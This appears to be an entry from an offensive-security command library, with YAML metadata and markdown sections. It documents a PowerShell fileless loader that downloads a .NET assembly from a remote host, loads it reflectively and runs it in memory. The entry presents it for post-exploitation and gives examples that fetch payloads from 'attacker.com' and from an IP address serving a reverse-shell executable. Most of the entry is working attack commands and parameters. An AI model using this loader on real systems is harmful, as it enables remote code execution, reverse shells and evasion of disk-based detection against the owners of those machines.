---
id: fbf43c10-1a5a-4993-9958-c7c95d7147fc
name: powershell-download-and-run-assembly-without-arguments
type: command
executor: powershell
data: |-
  $data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
  $assem = [System.Reflection.Assembly]::Load($data)
  [$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD()
output: null
created_at: '2023-04-06T03:56:24.082002+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reflective-loading
  - powershell
verified: true
validated: true
---

# powershell-download-and-run-assembly-without-arguments

## Command

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
$assem = [System.Reflection.Assembly]::Load($data)
[$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD()
```

## Description

This PowerShell command downloads a .NET assembly from a remote URL, loads it reflectively into memory, and executes its main entry point without arguments or disk writes. Use it for simple executables like custom payloads in post-exploitation scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ASSEMBLY_URL | URL to the .NET executable assembly | Yes |
| $_NAMESPACE | Namespace of the assembly's entry class (e.g., rev) | Yes |
| $_CLASS | Class name containing the entry method (e.g., Program) | Yes |
| $_ENTRY_METHOD | Method to invoke (e.g., Main) | Yes |

## Examples

### Basic Usage

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Payload.Program]::Main()
```

### Advanced Usage

For a reverse shell assembly:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```

## Expected Output

The assembly executes in memory, producing output based on its functionality (e.g., "Shell connected" for a reverse shell or console messages). No errors if load succeeds; otherwise, exceptions like "Could not load file or assembly".

## Related

- [[procedures/Reflective-Assembly-Loading-with-PowerShell]]
- [[commands/powershell-download-and-run-rubeus-with-arguments]]
